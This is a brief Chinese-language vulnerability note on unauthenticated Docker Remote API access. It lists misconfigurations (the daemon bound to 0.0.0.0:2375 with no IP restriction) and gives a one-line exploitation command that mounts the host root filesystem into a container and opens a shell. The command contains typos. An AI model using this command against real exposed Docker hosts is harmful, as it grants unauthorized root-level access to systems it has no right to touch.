### Docker\_remote\_api未授权访问漏洞

#### 漏洞成因

1.  dockerd -H unix:///var/run/docker. sock -H 0.0. 0.0:2375
2.  docker守护进程监听在0.0.0.0，外网可访问
3.  没有使用iptable等限制可连接的来源ip。

#### 漏洞利用

  

```

docker H tcp://*.*.*.*:2375 run -it-v /:/mnt imagelD /bin/bash
```
